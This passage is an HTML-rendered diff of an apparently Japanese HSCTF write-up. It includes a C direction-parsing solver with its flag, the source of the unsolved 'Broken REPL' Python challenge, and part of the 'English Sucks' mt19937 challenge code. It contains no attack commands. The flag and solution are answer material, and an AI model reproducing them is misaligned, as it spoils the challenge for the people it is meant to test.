+				<span class="n">x2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;east&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">--</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">east</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">x2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;west&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">x1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">x2</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">west</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">x1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">x2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;north&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">y1</span><span class="o">++</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">--</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">north</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">y1</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="s">&#34;south&#34;</span> <span class="p">);</span>
-			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
-				<span class="n">y1</span><span class="o">--</span><span class="p">;</span>
-				<span class="n">y2</span><span class="o">++</span><span class="p">;</span>
+			<span class="n">find</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span> <span class="n">tmp_buff</span><span class="p">,</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">south</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="n">find</span> <span class="o">!</span><span class="o">=</span> <span class="nb">NULL</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="n">y1</span><span class="o">-</span><span class="o">-</span><span class="p">;</span>
+				<span class="n">y2</span><span class="o">+</span><span class="o">+</span><span class="p">;</span>
 				<span class="k">continue</span><span class="p">;</span>
 			<span class="p">}</span>
-			<span class="n">puts</span><span class="p">(</span> <span class="s">&#34;error&#34;</span> <span class="p">);</span>
+			<span class="n">puts</span><span class="p">(</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">error</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
 		<span class="p">}</span>
-		<span class="n">ans</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span> <span class="n">sqrt</span><span class="p">(</span> <span class="p">(</span><span class="n">x2</span> <span class="o">-</span> <span class="n">x1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">x2</span> <span class="o">-</span> <span class="n">x1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">y2</span> <span class="o">-</span> <span class="n">y1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">y2</span> <span class="o">-</span> <span class="n">y1</span><span class="p">)</span> <span class="p">)</span> <span class="o">+</span> <span class="mf">0.5</span><span class="p">);</span>
-		<span class="n">printf</span><span class="p">(</span> <span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">ans</span> <span class="o">%</span> <span class="mi">26</span><span class="p">]</span> <span class="p">);</span>
-		<span class="n">fclose</span><span class="p">(</span> <span class="n">fp</span> <span class="p">);</span>
+		<span class="n">ans</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="p">(</span> <span class="n">sqrt</span><span class="p">(</span> <span class="p">(</span><span class="n">x2</span> <span class="o">-</span> <span class="n">x1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">x2</span> <span class="o">-</span> <span class="n">x1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">y2</span> <span class="o">-</span> <span class="n">y1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">y2</span> <span class="o">-</span> <span class="n">y1</span><span class="p">)</span> <span class="p">)</span> <span class="o">+</span> <span class="mf">0.5</span><span class="p">)</span><span class="p">;</span>
+		<span class="n">printf</span><span class="p">(</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">%c</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">ans</span> <span class="o">%</span> <span class="mi">26</span><span class="p">]</span> <span class="p">)</span><span class="p">;</span>
+		<span class="n">fclose</span><span class="p">(</span> <span class="n">fp</span> <span class="p">)</span><span class="p">;</span>
 	<span class="p">}</span>
-	<span class="n">printf</span><span class="p">(</span> <span class="s">&#34;}</span><span class="se">\n</span><span class="s">&#34;</span> <span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">}</span><span class="se">\n</span><span class="s">&#34;</span> <span class="p">)</span><span class="p">;</span>
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>strstr()をやる順番に注意。最初、&rdquo;east&rdquo;のチェックをアタマに入れていたら、&rdquo;northeast&rdquo;と&rdquo;southeast&rdquo;も持っていかれて違う答えになっちゃってました。。
-<br /><br />
+</div><p>strstr()をやる順番に注意。最初、&ldquo;east&quot;のチェックをアタマに入れていたら、&ldquo;northeast&quot;と&quot;southeast&quot;も持っていかれて違う答えになっちゃってました。。
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 hsctf{garminesuckz}</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="broken-repl-miscellaneous">Broken REPL (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>My friend says that there is a bug in my REPL. Can you help me find it?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>repl.py</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -662,23 +592,24 @@ hsctf{garminesuckz}</p>
 </span><span class="lnt">22
 </span><span class="lnt">23
 </span><span class="lnt">24
+</span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">flag</span><span class="p">:</span> <span class="c1"># open flag file</span>
-    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="c1"># read contents of flag file</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">flag.txt</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">flag</span><span class="p">:</span> <span class="c1"># open flag file</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="p">)</span> <span class="c1"># read contents of flag file</span>
 <span class="k">try</span><span class="p">:</span> <span class="c1"># make sure we don&#39;t run out of memory</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># do this forever</span>
         <span class="k">try</span><span class="p">:</span> <span class="c1"># try to read a line of input</span>
-            <span class="n">line</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> <span class="c1"># prompt is python&#39;s standard prompt</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">&gt;&gt;&gt; </span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># prompt is python&#39;s standard prompt</span>
         <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span> <span class="c1"># user is done typing input</span>
-            <span class="k">print</span><span class="p">()</span> <span class="c1"># ensure there is a line-break</span>
+            <span class="k">print</span><span class="p">(</span><span class="p">)</span> <span class="c1"># ensure there is a line-break</span>
             <span class="k">break</span> <span class="c1"># exit from the loop</span>
         <span class="k">else</span><span class="p">:</span> <span class="c1"># successfully read input</span>
             <span class="k">try</span><span class="p">:</span> <span class="c1"># try to compile the input</span>
-                <span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s2">&#34;&lt;input&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">)</span> <span class="c1"># compile the line of input</span>
+                <span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;</span><span class="s2">&lt;input&gt;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa"></span><span class="s2">&#34;</span><span class="s2">exec</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># compile the line of input</span>
             <span class="k">except</span> <span class="p">(</span><span class="ne">OverflowError</span><span class="p">,</span> <span class="ne">SyntaxError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">,</span> <span class="n">RecursionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> <span class="c1"># user input was bad</span>
-                <span class="k">print</span><span class="p">(</span><span class="s2">&#34;there was an error in your code:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span> <span class="c1"># notify the user of the error</span>
+                <span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">there was an error in your code:</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span> <span class="c1"># notify the user of the error</span>
             <span class="k">if</span> <span class="bp">False</span><span class="p">:</span> <span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c1"># run the code</span>
             <span class="c1"># TODO: find replacement for exec</span>
             <span class="c1"># TODO: exec is unsafe</span>
@@ -687,36 +618,29 @@ hsctf{garminesuckz}</p>
     <span class="c1"># lets remove the flag to clear up some memory</span>
     <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="c1"># log the flag so it is not lost</span>
     <span class="k">del</span> <span class="n">flag</span> <span class="c1"># delete the flag</span>
-    <span class="c1"># hopefully we have enough memory now</span></code></pre></td></tr></table>
-</div>
-</div>
-<h2 id="not-solved">(Not solved)</h2>
+    <span class="c1"># hopefully we have enough memory now</span>
 
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="not-solved">(Not solved)</h2>
 <p>MemoryError例外を起こせばいいようだけど、できませんでした。raise使ったり、ウェブでMemoryError例外の事象のサンプルとか見つけてやったけれど、意図的に発生させようとするとなかなか難しいもんですね。</p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="english-sucks-miscellaneous">English Sucks (Miscellaneous)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>English is such a confusing language. Can you help me understand it?
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 Hint: Watch out for the order of the output.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>mt.cpp</li>
 </ul>
-
 <p>以下、抜粋。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -774,113 +698,102 @@ Hint: Watch out for the order of the output.</p>
 </span><span class="lnt">56
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;fstream&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;random&gt;</span><span class="cp">
+<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;fstream&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="cp">#</span><span class="cp">include</span> <span class="cpf">&lt;random&gt;</span><span class="cp">
 </span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">std</span><span class="o">::</span><span class="n">mt19937</span> <span class="n">random</span><span class="p">{</span><span class="n">std</span><span class="o">::</span><span class="n">random_device</span><span class="p">()()};</span>
-    <span class="n">std</span><span class="o">::</span><span class="n">ios</span><span class="o">::</span><span class="n">sync_with_stdio</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">:</span><span class="o">:</span><span class="n">mt19937</span> <span class="n">random</span><span class="p">{</span><span class="n">std</span><span class="o">:</span><span class="o">:</span><span class="n">random_device</span><span class="p">(</span><span class="p">)</span><span class="p">(</span><span class="p">)</span><span class="p">}</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">:</span><span class="o">:</span><span class="n">ios</span><span class="o">:</span><span class="o">:</span><span class="n">sync_with_stdio</span><span class="p">(</span><span class="nb">false</span><span class="p">)</span><span class="p">;</span>
 
-    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;English sucks!</span><span class="se">\n</span><span class="s">&#34;</span>
-	         <span class="s">&#34;I just noticed the other day that the letters</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;B, C, D, G, P, T, V, and Z all rhyme with E</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;(Z = zee in USA)</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;My hearing is bad, and sometimes I have trouble</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;identifying some of the letters.</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;Can you help me understand what letter is being said?</span><span class="se">\n</span><span class="s">&#34;</span>
-                 <span class="s">&#34;Here, I&#39;ll give you some sample answers:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+    <span class="n">std</span><span class="o">:</span><span class="o">:</span><span class="n">cout</span> <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">English sucks!</span><span class="se">\n</span><span class="s">&#34;</span>
+	         <span class="sa"></span><span class="s">&#34;</span><span class="s">I just noticed the other day that the letters</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">B, C, D, G, P, T, V, and Z all rhyme with E</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">(Z = zee in USA)</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">My hearing is bad, and sometimes I have trouble</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">identifying some of the letters.</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">Can you help me understand what letter is being said?</span><span class="se">\n</span><span class="s">&#34;</span>
+                 <span class="sa"></span><span class="s">&#34;</span><span class="s">Here, I&#39;ll give you some sample answers:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
 
-    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">216</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">;)</span> <span class="p">{</span>
-        <span class="k">auto</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
-        <span class="k">auto</span> <span class="n">v2</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
-        <span class="k">auto</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
+    <span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">216</span><span class="p">;</span> <span class="n">i</span><span class="o">-</span><span class="o">-</span><span class="p">;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">auto</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">random</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+        <span class="k">auto</span> <span class="n">v2</span> <span class="o">=</span> <span class="n">random</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+        <span class="k">auto</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">random</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
 
-        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1F</span> <span class="o">&amp;</span> <span class="mh">0x1</span> <span class="o">|</span> <span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x09</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x05</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x08</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x15</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x06</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1D</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1B</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x04</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0D</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0A</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1A</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x16</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x17</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1C</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x14</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x01</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x11</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x00</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x13</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x18</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0B</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x19</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x10</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x03</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x12</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0F</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x02</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0C</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x07</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v3</span> <span class="o">&gt;&gt;</span> <span class="mh">0x0E</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">]</span>
-                  <span class="o">&lt;&lt;</span> <span class="s">&#34;BCDGPTVZ&#34;</span><span class="p">[</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1E</span> <span class="o">&amp;</span> <span class="mh">0x3</span> <span class="o">|</span> <span class="n">v2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x00</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">]</span>
-		  <span class="o">&lt;&lt;</span> <span class="sc">&#39;\n&#39;</span><span class="p">;</span>
+        <span class="n">std</span><span class="o">:</span><span class="o">:</span><span class="n">cout</span> <span class="o">&lt;</span><span class="o">&lt;</span> <span class="sa"></span><span class="s">&#34;</span><span class="s">BCDGPTVZ</span><span class="s">&#34;</span><span class="p">[</span><span class="n">v2</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x1F</span> <span class="o">&amp;</span> <span class="mh">0x1</span> <span class="o">|</span> <span class="n">v3</span> <span class="o">&gt;</span><span class="o">&gt;</span> <span class="mh">0x0</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="p">]</span>
